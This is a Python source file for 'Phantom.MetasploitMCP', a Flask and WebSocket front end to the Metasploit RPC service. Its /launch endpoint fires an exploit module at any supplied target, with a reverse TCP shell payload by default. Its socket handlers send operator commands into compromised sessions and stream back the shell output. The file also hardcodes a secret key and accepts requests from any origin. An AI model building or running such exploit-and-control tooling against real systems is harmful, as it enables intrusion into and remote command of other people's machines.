#!/usr/bin/env python3
import logging
import threading
import time
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from phantom.msf.rpc_client import MSFRPCClient
from phantom.config import config

# Setup Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Phantom.MetasploitMCP")

# Initialize Flask + SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'phantom_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*")

# MSF RPC Client
msf_client = MSFRPCClient(
    host=config.MSF_RPC_HOST,
    port=config.MSF_RPC_PORT,
    user=config.MSF_RPC_USER,
    password=config.MSF_RPC_PASSWORD,
    use_ssl=config.MSF_RPC_SSL
)

# Active session monitoring threads
monitoring_sessions = set()

def session_reader_thread(session_id):
    """Background task to poll Metasploit for new shell/meterpreter output."""
    logger.info(f"[*] Started output listener for Session {session_id}")
    while session_id in monitoring_sessions:
        if not msf_client.token:
            msf_client.login()
        
        # Determine if it's shell or meterpreter (Simplified check)
        res = msf_client.call("session.shell_read", [str(session_id)])
        
        if res and res.get('data'):
            output = res.get('data')
            socketio.emit('shell_output', {'session_id': session_id, 'data': output})
        
        time.sleep(1) # Poll interval

@socketio.on('connect')
def handle_connect():
    logger.info(f"Client connected: {request.sid}")
    emit('status', {'msg': 'Connected to Phantom WebSocket'})

@socketio.on('start_monitor')
def handle_monitor(data):
    """Client requests to start seeing output for a specific session."""
    session_id = data.get('session_id')
    if session_id and session_id not in monitoring_sessions:
        monitoring_sessions.add(session_id)
        thread = threading.Thread(target=session_reader_thread, args=(session_id,))
        thread.daemon = True
        thread.start()

@socketio.on('send_command')
def handle_command(data):
    """Receives a command from the UI and writes it to the MSF session."""
    session_id = data.get('session_id')
    command = data.get('command', '')
    
    if session_id and command:
        logger.info(f"[>] Command to Session {session_id}: {command}")
        # Write to MSF RPC
        msf_client.call("session.shell_write", [str(session_id), f"{command}\n"])

@app.route("/list_targets")
def list_targets():
    sessions = msf_client.call("session.list", [])
    return jsonify({"targets": sessions})

@app.route("/launch", methods=["POST"])
def launch():
    data = request.get_json() or {}
    opts = {"RHOSTS": data.get("target"), "PAYLOAD": data.get("payload", "generic/shell_reverse_tcp")}
    result = msf_client.call("module.execute", ["exploit", data.get("exploit"), opts])
    return jsonify(result)

if __name__ == "__main__":
    logger.info("Starting MetasploitMCP with WebSockets on port 8085...")
    socketio.run(app, host="127.0.0.1", port=8085, debug=config.FLASK_DEBUG)
